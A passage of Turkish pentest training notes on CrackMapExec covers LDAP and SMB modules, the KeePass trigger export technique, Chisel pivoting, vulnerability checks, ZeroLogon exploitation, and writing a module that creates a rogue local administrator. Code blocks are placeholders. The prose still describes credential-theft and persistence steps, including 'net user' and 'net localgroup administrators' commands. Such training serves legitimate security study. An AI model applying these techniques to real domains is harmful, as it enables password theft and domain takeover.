`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

